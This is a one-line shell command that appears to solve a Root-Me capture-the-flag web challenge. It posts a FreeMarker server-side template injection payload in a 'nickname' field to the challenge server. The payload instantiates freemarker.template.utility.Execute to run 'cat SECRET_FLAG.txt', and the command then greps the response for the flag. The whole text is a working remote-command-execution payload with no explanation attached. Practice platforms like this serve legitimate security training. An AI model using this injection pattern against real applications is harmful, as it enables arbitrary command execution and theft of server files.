curl -s --data-urlencode 'nickname=<#assign ex="freemarker.template.utility.Execute"?new ()>${ex("cat SECRET_FLAG.txt")}' http://challenge01.root-me.org/web-serveur/ch41/check | \grep -o 'B3.*$'
